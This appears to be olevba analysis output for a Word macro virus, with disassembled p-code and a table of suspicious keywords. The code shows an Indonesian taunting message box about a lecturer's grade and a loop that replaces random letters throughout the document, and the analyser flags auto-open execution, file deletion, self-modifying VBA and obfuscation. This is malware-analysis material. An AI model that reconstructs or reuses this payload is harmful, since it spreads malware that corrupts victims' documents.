' 	ArgsCall Beep 0x0000 
' Line #204:
' 	StartForVariable 
' 	Ld g 
' 	EndForVariable 
' 	NextVar 
' Line #205:
' 	LineCont 0x0010 0B 00 04 00 20 00 04 00 27 00 04 00 35 00 04 00
' 	LitStr 0x002A "Terimakasih buat dosenku yang amat sangat "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "bijaksana"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0035 "yang telah memberiku nilai JELEK. Saya merasa bangga "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0030 "dan sungguh-sungguh bangga terhadap dosenku itu."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 "Sekali lagi saya ucapkan terimakasih!."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001D "Semoga mereka tetap di STIKI."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0025 "(buat teman-teman, ma'af mengganggu.)"
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x0012 "Ucapan Terimakasih"
' 	ArgsLd MsgBox 0x0003 
' 	St H 
' Line #206:
' 	QuoteRem 0x0001 0x0013 "*******************"
' Line #207:
' 	QuoteRem 0x0000 0x0017 "***********************"
' Line #208:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001D 
' 	For 
' Line #209:
' 	QuoteRem 0x0000 0x0017 "***********************"
' Line #210:
' 	Dim 
' 	VarDefn NewHos (As Object)
' Line #211:
' 	OnError (Resume Next) 
' Line #212:
' 	Label Again 
' Line #213:
' 	QuoteRem 0x0000 0x000B "ReplaceWith"
' Line #214:
' 	LitStr 0x0000 ""
' 	St NewName 
' Line #215:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	For 
' Line #216:
' 	LitDI2 0x0045 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St GenNewNo 
' Line #217:
' 	Ld New 
' 	Ld GenNewNo 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld i 
' 	ArgsSt MyName 0x0001 
' Line #218:
' 	Ld i 
' 	ArgsLd MyName 0x0001 
' 	St NewName 
' Line #219:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #220:
' 	LitStr 0x0034 "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz"
' 	St ChGThiS 
' Line #221:
' 	QuoteRem 0x0000 0x0010 "FindAnDReplaceiT"
' Line #222:
' 	LitStr 0x0000 ""
' 	St FindName 
' Line #223:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	For 
' Line #224:
' 	LitDI2 0x0034 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St FindOldName 
' Line #225:
' 	Ld ChGThiS 
' 	Ld FindOldName 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld B 
' 	ArgsSt FindTheName 0x0001 
' Line #226:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #227:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #228:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #229:
' 	Ld B 
' 	ArgsLd FindTheName 0x0001 
' 	MemStWith Then 
' Line #230:
' 	Ld NewName 
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #231:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #232:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #233:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #234:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #235:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #236:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #237:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #238:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #239:
' 	EndWith 
' Line #240:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #241:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #242:
' 	EndIfBlock 
' Line #243:
' 	EndSub 
' Line #244:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

